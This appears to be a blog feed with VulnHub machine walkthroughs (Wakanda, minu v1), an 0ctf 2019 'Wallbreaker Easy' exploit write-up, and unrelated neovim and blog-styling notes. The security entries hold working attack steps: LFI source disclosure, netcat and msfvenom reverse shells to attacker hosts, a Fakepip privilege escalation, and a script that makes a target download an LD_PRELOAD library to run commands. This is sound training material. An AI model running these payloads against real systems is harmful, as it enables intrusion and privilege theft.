<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.post &#123;</span><br><span class="line">  margin-top: 60px;</span><br><span class="line">  margin-bottom: 60px;</span><br><span class="line">  padding: 25px;</span><br><span class="line">  -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5);</span><br><span class="line">  -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="自定义图标"><a href="#自定义图标" class="headerlink" title="自定义图标"></a>自定义图标</h2><p><a href="https://www.easyicon.net/language.en/iconsearch" target="_blank" rel="noopener">https://www.easyicon.net/language.en/iconsearch</a></p>
<p>下载32的,然后放在主题文件中的images文件中,在配置中搜索favicon并修改</p>
<h2 id="统计访问人数"><a href="#统计访问人数" class="headerlink" title="统计访问人数"></a>统计访问人数</h2><p>在<code>themes/你的主题/layout/_partial/footer.swig</code>中定位并插入如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"copyright"</span>&gt;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    &lt;script <span class="keyword">async</span> src=<span class="string">"//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"</span>&gt;</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    &lt;span class="post-meta-divider"&gt;|&lt;/</span>span&gt;</span><br><span class="line">    &lt;span id=<span class="string">"busuanzi_container_site_pv"</span>&gt;</span><br><span class="line">        本站总访问量: <span class="xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_pv"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span>次</span><br><span class="line">    &lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br></pre></td></tr></table></figure>

<h3 id="set-specific-article-as-top"><a href="#set-specific-article-as-top" class="headerlink" title="set specific article as top"></a>set specific article as top</h3><p>see the link below:</p>
<p><a href="https://www.jianshu.com/p/42a4efcdf8d7" target="_blank" rel="noopener">https://www.jianshu.com/p/42a4efcdf8d7</a></p>
]]></content>
      <categories>
        <category>闲来无事</category>
      </categories>
  </entry>
  <entry>
    <title>Wakanda靶机渗透</title>
    <url>/2019/04/22/Wakanda%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>首先发现主机：<code>netdiscover</code>或者<code>arp-scan -l</code>，发现靶机</p>
<p>然后<code>nmap -sS -p- (victim_url)</code>，开放的端口有80，111，3333.<br>访问以下80端口，源码中有一行注释：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--herf=&quot;?lang=fr&quot;--&gt;</span><br></pre></td></tr></table></figure>

<p>尝试给访问<code>url/?lang=fr</code>，发现页面的语言变成了法语。考虑文件包含，访问<code>url/?lang=php://filter/read=convert.base64-encode/resource=index</code>(index和index.php都要试一下)。<br>解码之后得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password =<span class="string">"Niamey4Ever227!!!"</span> ;<span class="comment">//I have to remember it</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'lang'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'lang'</span>].<span class="string">".php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里有一个密码，然后在之前的网页中，可以看见最下方有一个用户名，尝试用这个用户名和密码去ssh登陆。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh mamadou@(url) -p 3333</span><br></pre></td></tr></table></figure>

<p>然后输入密码就可以连接进入靶机了。进入之后发现是一个python的交互界面，这个时候可以调用<code>pty</code>库来进入交互式的<code>shell</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawm(<span class="string">"/bin/bash"</span>)</span><br></pre></td></tr></table></figure>

<p>这样子我们就来到了bash，并拿到了第一个flag，尝试使用命令<code>sudo -l</code>来查看当前用户<code>所能执行的root用户命令</code>，结果并没有可执行的root命令。查看有没有其他用户(可以通过查看<code>/etc/passwd</code>或者<code>/home</code>目录下的用户得知用户信息)。发现有一个叫做<code>devops</code>的用户，通过<code>find / -user devops 2&gt;/dev/null</code>来发现<code>devops</code>的文件，发现第二个flag，同时还有一个<code>.antivirus.py</code>文件。</p>
<p>进入发现源代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">open(<span class="string">'/tmp/test'</span>,<span class="string">'w'</span>).write(<span class="string">'test'</span>)</span><br></pre></td></tr></table></figure>

<p>我们将那个test文件删掉之后过一段时间又会出现，然后结合py的文件名，可以推测这个脚本会隔一段时间执行一次。<br>那么我们可以利用这个来反弹shell。改写改py文件如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">"nc (my_host) -p 4444 -e '/bin/bash' -i"</span>)</span><br></pre></td></tr></table></figure>

<p>然后其他的writeup中是这样利用的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python lhost=192.168.43.242 lport=4444 R</span><br></pre></td></tr></table></figure>

<p>然后把生成的<code>poc</code>写进py文件中来。<br>然后在自己的攻击机上开启nc,<code>nc -lvp 4444</code>由于py文件执行的时候，执行的身份是<code>devops</code>所以我们得到的是devops的shell，可以查看第二个flag的内容了。</p>
<p>然后<code>sudo -l</code>查看该用户可用的管理员命令，发现一个<code>pip</code>可以执行，然后有一个<code>Fakepip</code>的脚本可以利用，在攻击机上把脚本给下载过来，然后在脚本目录下运行<code>sudo python -m SimpleHttpServer 80</code>来运行简单的<code>python http</code>服务，然后在靶机上运行<code>wget http://(attacker url)/setup.py</code>来把Fakepip中的setup脚本传输过去。记得在传输之前修改setup脚本中的lhost和lport，然后在靶机中运行setup.py，同时在攻击机上面运行<code>nc -lvp 4444</code>接受shell，然后就得到了root权限</p>
]]></content>
      <categories>
        <category>靶机渗透</category>
      </categories>
  </entry>
  <entry>
    <title>minuv1靶机渗透记录(存疑)</title>
    <url>/2019/04/22/minuv1%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>在这次靶机渗透过程中有很多存疑的地方，特别是<code>tty</code>的获得那一块，网上有很多不同的解法，但是其原理还需细细探索。</p>
<p>首先使用<code>netdiscover</code>发现靶机，<code>nmap</code>扫描端口，访问无特别信息。</p>
<p>使用github上的<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a>来扫描目录（我用kali自带的dirb没有扫到），发现<code>text.php</code>。</p>
<p>访问并点击链接，关注<code>url：http://192.168.43.83/test.php?file=last.html</code>。</p>
<ul>
<li>猜测1：正常的文件访问<ul>
<li>file参数改成/etc/passwd，访问失败</li>
</ul>
</li>
<li>猜测2：命令执行，通过cat之类的命令来访问，命令之间用分号分隔<ul>
<li>file参数为file=last.html;whoami访问失败</li>
<li>file参数为file=last.html;id访问成功<br>但是在尝试反弹<code>shell（nc、/bin/nc、netcat、/bin/netcat）</code>的时候失败了，这里有一个<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">绕过安全策略的网站</a>，收集了执行命令的方法。</li>
</ul>
</li>
</ul>
<p>于是<code>file=a;busybox nc 192.169.43.211 4444 -e /bin/sh -i</code>，同时攻击机上运行<code>nc -lvp 4444</code></p>
<p>然后拿到了shell,进入<code>/home/bob</code>目录发现<code>._pw_</code>文件，里面有一串<code>jwt</code><a href="https://www.vaadata.com/blog/jwt-tokens-and-security-working-principles-and-use-cases/" target="_blank" rel="noopener">josn web<br>tocken</a>,然后github上有一个脚本来破解其中的secret-key：<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">工具链接</a>,跑完后得到<code>secretkey</code>。</p>
<hr>
<p>从这里开始涉及知识盲区了，尝试用<code>secretkey</code>去登陆<code>bob</code>和<code>root</code>（这个有点脑洞）。但是这不是<code>tty shell</code>，所以不能直接执行su命令，因为会让你输入密码。</p>
<p>考虑到权限的问题，将目录切换到<code>/tmp</code>下，在这里所有用户都有完整的读写权限。然后执行<code>script -c &quot;/bin/bash&quot;</code>,这样就来到了<code>bash</code>环境中，然后用<code>su</code>命令，能成功登陆root用户，提权成功。</p>
<p><img src="http://ww1.sinaimg.cn/large/0062HBMaly1g13iqh4iexj30p30fmmz0.jpg" alt></p>
<p>但是关于ttyshell的知识还是比较模糊，需要再找找资料。</p>
<p>参考文章：</p>
<p><a href="https://medium.com/@honze_net/vulnhub-minu-1-write-up-8032fdda5939" target="_blank" rel="noopener">https://medium.com/@honze_net/vulnhub-minu-1-write-up-8032fdda5939</a></p>
<p><a href="https://0x10f8.wordpress.com/2018/09/15/vulnhub-minuv1-ctf/" target="_blank" rel="noopener">https://0x10f8.wordpress.com/2018/09/15/vulnhub-minuv1-ctf/</a></p>
]]></content>
      <categories>
        <category>靶机渗透</category>
      </categories>
  </entry>
  <entry>
    <title>0ctf 2019 web Wallbreaker Easy</title>
    <url>/2019/04/22/0ctf-2019-web-Wallbreaker-Easy/</url>
    <content><![CDATA[<h2 id="前言：菜是原罪"><a href="#前言：菜是原罪" class="headerlink" title="前言：菜是原罪"></a>前言：菜是原罪</h2><p>这道题目参考了小西师傅、一叶飘零和郭dalao学长的分享,真实地感觉自己的菜了。。。</p>
<p>在写脚本的过程中遇见了很多诡异的问题，先留着琢磨。</p>
<h2 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h2><p>利用<code>Imagick()</code>中会触发<code>php解释器向外开启系统进程</code>的方法，这里的思路是当传入<code>MPEG</code>格式类型的文件时候，为了转换格式会向外部环境请求并触发<code>ffmpeg</code>的调用，从而开启新的进程。在开启时，环境变量<code>LD_PRELOAD</code>会首先加载，而我们事先会将我们的<code>恶意共享文件hack.so在这个环境变量中指出来</code>，即<code>LD_PRELOAD={DIR}/hack.so</code>。hack.so共享文件由hack.c文件编译，其中调用了<code>__attribute__((constructor))</code>，该方法会在共享文件被加载的时候率先被执行，至于执行的代码，当然就是<code>/readflag &gt; {dir}/flag</code>啦。主要代码如下，代码写法借鉴了郭大佬的脚本，虽然思路不一样，个人感觉dalao的思路更加直接明了。</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://111.186.63.208:31340/"</span></span><br><span class="line">dir = <span class="string">"/tmp/ef757c06e983a137384378f47607abfa"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#the first time i do this ,i use format function 'format' to replace $dir but failed,then i used $dir and '%',worked ,after the flag went out ,the format problem seems to dispeare?</span></span><br><span class="line"><span class="comment">#the new Imagick('&#123;filename&#125;') beginning with no work,but didnot after replace'''to '"',also disapeared after sovled it</span></span><br><span class="line">cmd = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;pre&gt;hello???????&lt;br&gt;&lt;?php echo 'hello';?&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">$dir = "&#123;0&#125;";</span></span><br><span class="line"><span class="string">file_put_contents("&#123;0&#125;/hack.so",file_get_contents("http://207.148.64.125:80/hack.so"));</span></span><br><span class="line"><span class="string">chmod("&#123;0&#125;/hack.so",0777);</span></span><br><span class="line"><span class="string">putenv("LD_PRELOAD=&#123;0&#125;/hack.so");</span></span><br><span class="line"><span class="string">file_put_contents("&#123;0&#125;/ch4ser.wmv","sssss");</span></span><br><span class="line"><span class="string">file_put_contents("&#123;0&#125;/ch4ser","");</span></span><br><span class="line"><span class="string">$tocken = new Imagick('&#123;0&#125;/ch4ser.wmv');</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">'''</span>.format(dir)</span><br><span class="line"></span><br><span class="line"><span class="comment">#why the command line been executed can not be more than 2 in my script?cause the include will cause error</span></span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">file_put_contents('%s/evil',base64_decode("%s"));</span></span><br><span class="line"><span class="string">include "%s/evil";</span></span><br><span class="line"><span class="string">'''</span>%(dir,base64.b64encode(cmd),dir)</span><br><span class="line"></span><br><span class="line">print(requests.post(url, data=&#123;<span class="string">'backdoor'</span>: payload &#125;).content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> requests.post(url,data=&#123;<span class="string">'backdoor'</span>:<span class="string">"print_r(scandir('%s'));"</span>%dir&#125;).content</span><br><span class="line"><span class="keyword">print</span> requests.post(url,data=&#123;<span class="string">'backdoor'</span>:<span class="string">"echo file_get_contents('%s/ch4ser');"</span>%dir&#125;).content</span><br></pre></td></tr></table></figure>

<p>脚本写得很烂，注释部分可以忽略，是我在写的过程中遇到的小问题。</p>
<p>然后服务器上面的<code>hack.c</code>文件如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/readflag &gt; /tmp/ef757c06e983a137384378f47607abfa/ch4ser"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用命令<code>gcc --share -fPIC hack.c -o hack.so</code>命令来编译共享文件。在服务器目录下面开启<code>python -m SimpleHTTPServer 80</code>，并运行上述python脚本，即可看到flag。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/55161547-c39d6480-51a0-11e9-9f1c-f01618558228.png" alt="flag"></p>
<blockquote>
<p>ps:每个人的目录会不定时被服务器清空</p>
</blockquote>
]]></content>
      <categories>
        <category>无法归类的神级题目</category>
      </categories>
  </entry>
  <entry>
    <title>ch4ser 的 vim</title>
    <url>/2019/04/22/ch4ser%E2%80%98s%20vim/</url>
    <content><![CDATA[<h1 id="ch4ser-的-vim"><a href="#ch4ser-的-vim" class="headerlink" title="ch4ser 的 vim"></a>ch4ser 的 vim</h1><blockquote>
<p>前言:没有比把时间花在配置上更傻逼的事情了.</p>
</blockquote>
<p>《程序员修炼之道》中有一句话:<code>最好是精通一种编辑器，并将其用于所有编辑任务。如果不坚持使用一种编辑器，可能会面临现代的巴别特大混乱。</code> ，实质今日，深以为然。而自从接触vim之后我一直都保持着有空折腾折腾的好习惯，它的简洁和高度自由让人着迷，围绕着vim衍生出的插件数不胜数。奈何插件繁多的同时也意味着选择的困难和配置的繁琐。为了准备以后可能出现的突发情况比如配置丢失或者重新安装，特在此以实现特定功能为主题，记录自己配置vim的过程。</p>
<hr>
<p>相比较vim, neovim的速度更快.</p>
<p>为了调动食欲,先上效果图:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61574401-c9250e80-aaf1-11e9-9e2b-0350e5f43c62.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61574421-13a68b00-aaf2-11e9-9ab1-57b763f13f52.png" alt="image"></p>
<p>vim下打开终端</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61574428-405aa280-aaf2-11e9-9045-422e38dd6e11.png" alt="image"></p>
<h2 id="以下内容是配置"><a href="#以下内容是配置" class="headerlink" title="以下内容是配置"></a>以下内容是配置</h2><h3 id="安装（vim-plug）"><a href="#安装（vim-plug）" class="headerlink" title="安装（vim-plug）"></a>安装（vim-plug）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.local/share/nvim/site/autoload/plug.vim --create-dirs \</span><br><span class="line">    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span><br></pre></td></tr></table></figure>

<h3 id="config-nvim-init-vim"><a href="#config-nvim-init-vim" class="headerlink" title="~/.config/nvim/init.vim"></a>~/.config/nvim/init.vim</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">" c to caplock , add XKBOPTIONS="caps:escape" in /etc/default/keyboard</span><br><span class="line"></span><br><span class="line">" 让进入vim的时候显示绝对行号,当进入编辑模式的时候也显示绝对行号,但是从编辑模式回到普通模式的时候切换到相对行号</span><br><span class="line">set number</span><br><span class="line">augroup relative_numbser</span><br><span class="line"> autocmd!</span><br><span class="line"> autocmd InsertEnter * :set norelativenumber</span><br><span class="line"> autocmd InsertLeave * :set relativenumber</span><br><span class="line">augroup END</span><br><span class="line"></span><br><span class="line">set wildmenu</span><br><span class="line">" 忽略大小写</span><br><span class="line">set ignorecase</span><br><span class="line">set shell=/bin/zsh</span><br><span class="line"></span><br><span class="line">" font and icons for vim</span><br><span class="line">set encoding=utf8</span><br><span class="line">" set guifont=DroidSansMono\ Nerd\ Font\ 11</span><br><span class="line">autocmd User Startified setlocal buflisted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">" leader键映射</span><br><span class="line">let mapleader="\&lt;Space&gt;"</span><br><span class="line">map &lt;leader&gt;w :w&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;q :q!&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;r :call Runit()&lt;CR&gt;</span><br><span class="line">" 设定函数,自动根据文件类型来调用相应的解释器来执行代码</span><br><span class="line">func Runit()</span><br><span class="line">    if &amp;filetype == 'php'</span><br><span class="line">	exec "!time php %"</span><br><span class="line">    elseif &amp;filetype == 'python'</span><br><span class="line">	exec "!time python %"</span><br><span class="line">    elseif &amp;filetype == 'c'</span><br><span class="line">	exec "!gcc % -o %&lt;"</span><br><span class="line">	exec "!time sudo ./%&lt;"</span><br><span class="line">    elseif &amp;filetype == 'cpp'</span><br><span class="line">	exec "!g++ % -o %&lt;"</span><br><span class="line">	exec "!time ./%&lt;"</span><br><span class="line">    endif</span><br><span class="line">endfunc</span><br><span class="line">"</span><br><span class="line">" set shift width</span><br><span class="line">set shiftwidth=4</span><br><span class="line">set scrolloff=6</span><br><span class="line">" 启动鼠标</span><br><span class="line">set mouse=n</span><br><span class="line"></span><br><span class="line">map &lt;ScrollWheelUp&gt; &lt;C-Y&gt;</span><br><span class="line">map &lt;ScrollWheelDown&gt; &lt;C-E&gt;</span><br><span class="line"></span><br><span class="line">" 关于多窗口的键位映射</span><br><span class="line">map vs :vs </span><br><span class="line">map sp :sp </span><br><span class="line">map &lt;leader&gt;l &lt;C-w&gt;l</span><br><span class="line">map &lt;leader&gt;h &lt;C-w&gt;h</span><br><span class="line">map &lt;leader&gt;j &lt;C-w&gt;j</span><br><span class="line">map &lt;leader&gt;k &lt;C-w&gt;k</span><br><span class="line"></span><br><span class="line">map &lt;leader&gt;L &lt;C-w&gt;L</span><br><span class="line">map &lt;leader&gt;H &lt;C-w&gt;H</span><br><span class="line">map &lt;leader&gt;J &lt;C-w&gt;J</span><br><span class="line">map &lt;leader&gt;K &lt;C-w&gt;K</span><br><span class="line"></span><br><span class="line">" 终端模式</span><br><span class="line">map te :vs&lt;CR&gt;&lt;C-w&gt;L:te&lt;CR&gt;A</span><br><span class="line">tnoremap &lt;esc&gt; &lt;C-\&gt;&lt;C-n&gt;</span><br><span class="line"></span><br><span class="line">" 关于多标签模式的设定</span><br><span class="line">map tn :tabnew </span><br><span class="line">map L :tabnext&lt;CR&gt;</span><br><span class="line">map H :tabprev&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">" 代码折叠</span><br><span class="line">set foldmethod=indent</span><br><span class="line">set foldlevel=99</span><br><span class="line"></span><br><span class="line">"</span><br><span class="line">" 高亮当前的行和列</span><br><span class="line">set cursorcolumn</span><br><span class="line">set cursorline</span><br><span class="line">highlight CursorLine   cterm=NONE ctermbg=black ctermfg=green</span><br><span class="line">highlight CursorColumn cterm=NONE ctermbg=black ctermfg=green </span><br><span class="line"></span><br><span class="line">" 这段代码可以让每次打开文件的时候将光标定位到上一次所在的位置</span><br><span class="line">au BufReadPost * if line("'\"") &gt; 1 &amp;&amp; line("'\"") &lt;= line("$") | exe "normal! g'\"" | endif</span><br><span class="line"></span><br><span class="line">" 引入插件</span><br><span class="line">source ~/.vim/plugins.vim</span><br><span class="line">" 这个是为了在编写python的时候方便在vim内部浏览python文档而添加的，在github上有</span><br><span class="line">" source ~/.vim/pydoc.vim/ftplugin/python_pydoc.vim</span><br></pre></td></tr></table></figure>

<h3 id="vim-plugins-vim"><a href="#vim-plugins-vim" class="headerlink" title="~/.vim/plugins.vim"></a>~/.vim/plugins.vim</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call plug#begin(&apos;~/.vim/plugged&apos;)</span><br><span class="line"></span><br><span class="line">&quot; 代码补全插件</span><br><span class="line">&quot; Plug &apos;neoclide/coc.nvim&apos;, &#123;&apos;branch&apos;: &apos;release&apos;&#125;</span><br><span class="line">Plug &apos;ncm2/ncm2&apos;</span><br><span class="line">Plug &apos;ncm2/ncm2-jedi&apos; </span><br><span class="line">Plug &apos;ncm2/ncm2-bufword&apos;</span><br><span class="line">Plug &apos;ncm2/ncm2-path&apos;</span><br><span class="line">Plug &apos;roxma/nvim-yarp&apos;</span><br><span class="line">Plug &apos;phpactor/phpactor&apos; ,  &#123;&apos;do&apos;: &apos;composer install&apos;, &apos;for&apos;: &apos;php&apos;&#125;</span><br><span class="line">Plug &apos;phpactor/ncm2-phpactor&apos;</span><br><span class="line">&quot; 外观插件</span><br><span class="line">Plug &apos;KeitaNakamura/neodark.vim&apos;</span><br><span class="line">Plug &apos;cocopon/iceberg.vim&apos;</span><br><span class="line">Plug &apos;vim-airline/vim-airline&apos;</span><br><span class="line">Plug &apos;ryanoasis/vim-devicons&apos;</span><br><span class="line">&quot; 代码结构显示</span><br><span class="line">Plug &apos;vim-scripts/taglist.vim&apos;</span><br><span class="line">&quot; 代码标记,并且可以在标记之间跳转</span><br><span class="line">Plug &apos;MattesGroeger/vim-bookmarks&apos;</span><br><span class="line">&quot; 目录树</span><br><span class="line">Plug &apos;scrooloose/nerdtree&apos;</span><br><span class="line">&quot; 括号自动补全</span><br><span class="line">Plug &apos;jiangmiao/auto-pairs&apos;</span><br><span class="line">&quot; 快速注释</span><br><span class="line">Plug &apos;scrooloose/nerdcommenter&apos;</span><br><span class="line"> &quot; 花里胡哨的小插件，可以让打字发出音乐</span><br><span class="line">&quot; Plug &apos;skywind3000/vim-keysound&apos;</span><br><span class="line">call plug#end()</span><br><span class="line"></span><br><span class="line">&quot; Plugin setting</span><br><span class="line">&quot;</span><br><span class="line">source /home/ch4ser/.vim/plugset/nerdtree.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/ncm2.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/bookmark.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/airline.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/taglists.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/autopair.vim</span><br><span class="line">source /home/ch4ser/.vim/plugset/nerdcomment.vim</span><br><span class="line">&quot; source ~/.vim/plugset/keysound.vim</span><br></pre></td></tr></table></figure>

<h4 id="vim-plugset-ncm2-vim"><a href="#vim-plugset-ncm2-vim" class="headerlink" title="~/.vim/plugset/ncm2.vim"></a>~/.vim/plugset/ncm2.vim</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inoremap &lt;expr&gt; &lt;Tab&gt; pumvisible() ? &quot;\&lt;C-n&gt;&quot; : &quot;\&lt;Tab&gt;&quot;</span><br><span class="line">inoremap &lt;expr&gt; &lt;S-Tab&gt; pumvisible() ? &quot;\&lt;C-p&gt;&quot; : &quot;\&lt;S-Tab&gt;&quot;</span><br><span class="line">inoremap &lt;expr&gt; &lt;CR&gt; (pumvisible() ? &quot;\&lt;c-y&gt;\&lt;cr&gt;&quot;: &quot;\&lt;CR&gt;&quot;)</span><br><span class="line">autocmd BufEnter * call ncm2#enable_for_buffer()</span><br><span class="line">set completeopt=noinsert,menuone,noselect</span><br><span class="line">let ncm2#popup_delay = 5</span><br><span class="line">let g:ncm2#matcher = &quot;substrfuzzy&quot;</span><br><span class="line">let g:ncm2_jedi#python_version = 3</span><br><span class="line">let g:ncm2#match_highlight = &apos;sans-serif&apos;</span><br></pre></td></tr></table></figure>

<h4 id="vim-plugset-airline-vim"><a href="#vim-plugset-airline-vim" class="headerlink" title="~/.vim/plugset/airline.vim"></a>~/.vim/plugset/airline.vim</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;if you want to enable solarized theme ,quote the snipeet</span><br><span class="line">&quot; 这段代码让vim支持插件所需的色彩</span><br><span class="line">if (empty($TMUX))</span><br><span class="line">  if (has(&quot;nvim&quot;))</span><br><span class="line">    &quot;For Neovim 0.1.3 and 0.1.4 &lt; https://github.com/neovim/neovim/pull/2198 &gt;</span><br><span class="line">    let $NVIM_TUI_ENABLE_TRUE_COLOR=1</span><br><span class="line">  endif</span><br><span class="line">  &quot;For Neovim &gt; 0.1.5 and Vim &gt; patch 7.4.1799 &lt; https://github.com/vim/vim/commit/61be73bb0f965a895bfb064ea3e55476ac175162 &gt;</span><br><span class="line">  &quot;Based on Vim patch 7.4.1770 (`guicolors` option) &lt; https://github.com/vim/vim/commit/8a633e3427b47286869aa4b96f2bfc1fe65b25cd &gt;</span><br><span class="line">  &quot; &lt; https://github.com/neovim/neovim/wiki/Following-HEAD#20160511 &gt;</span><br><span class="line">  if (has(&quot;termguicolors&quot;))</span><br><span class="line">    set termguicolors</span><br><span class="line">  endif</span><br><span class="line">endif</span><br><span class="line"></span><br><span class="line">&quot;airline setting </span><br><span class="line">let g:airline_symbols = &#123;&#125;</span><br><span class="line">let g:airline_left_sep = &apos;&apos;</span><br><span class="line">let g:airline_left_alt_sep = &apos;&apos;</span><br><span class="line">let g:airline_right_sep = &apos;&apos;</span><br><span class="line">let g:airline_right_alt_sep = &apos;&apos;</span><br><span class="line">let g:airline_symbols.branch = &apos;&apos;</span><br><span class="line">let g:airline_symbols.readonly = &apos;&apos;</span><br><span class="line">let g:airline_symbols.linenr = &apos;&apos;</span><br><span class="line">let g:airline#extensions#tabline#enabled = 1</span><br><span class="line">let g:airline#extensions#tabline#show_buffers = 0</span><br><span class="line">let g:airline#extensions#tabline#show_tabs = 1</span><br><span class="line">let g:airline#extensions#tabline#fnamemod = &apos;:t&apos;</span><br><span class="line">let g:airline#extensions#tabline#left_sep = &apos; &apos;</span><br><span class="line">let g:airline#extensions#tabline#left_alt_sep = &apos;|&apos;</span><br><span class="line">&quot;</span><br><span class="line">&quot; 主题设置</span><br><span class="line">&quot; color schema</span><br><span class="line">&quot;主题设置为冰山主题</span><br><span class="line">&quot; colorscheme iceberg </span><br><span class="line">&quot; let g:airline_theme=&apos;iceberg&apos;</span><br><span class="line">&quot; let g:lightline = &#123;&apos;colorscheme&apos;: &apos;iceberg&apos;&#125;</span><br><span class="line">&quot;</span><br><span class="line">&quot; 设置主题为onedark</span><br><span class="line">colorscheme neodark</span><br></pre></td></tr></table></figure>

<h4 id="vim-plugset-nerdcomment-vim"><a href="#vim-plugset-nerdcomment-vim" class="headerlink" title="~/.vim/plugset/nerdcomment.vim"></a>~/.vim/plugset/nerdcomment.vim</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; comment plugin setting</span><br><span class="line">&quot;comment followed a space</span><br><span class="line">let g:NERDSpaceDelims=1</span><br></pre></td></tr></table></figure>

<h4 id="vim-plugset-autopair-vim"><a href="#vim-plugset-autopair-vim" class="headerlink" title="~/.vim/plugset/autopair.vim"></a>~/.vim/plugset/autopair.vim</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; autopair setting</span><br><span class="line">let g:AutoPairsShortcutJump = &apos;&lt;S-Tab&gt;&apos;</span><br><span class="line">let g:AutoPairsShortcutFastWrap=&apos;&lt;C-z&gt;&apos;</span><br></pre></td></tr></table></figure>

<h4 id="vim-plugset-nerdtree-vim"><a href="#vim-plugset-nerdtree-vim" class="headerlink" title="~/.vim/plugset/nerdtree.vim"></a>~/.vim/plugset/nerdtree.vim</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; T                 打开nerdree窗口，在左侧栏显示</span><br><span class="line">map T :NERDTreeToggle&lt;CR&gt;&lt;leader&gt;l</span><br><span class="line"></span><br><span class="line">&quot;close vim if the only window left open is a NERDTree</span><br><span class="line">autocmd bufenter * if (winnr(&quot;$&quot;) == 1 &amp;&amp; exists(&quot;b:NERDTree&quot;) &amp;&amp; b:NERDTree.isTabTree()) | q | endif</span><br></pre></td></tr></table></figure>

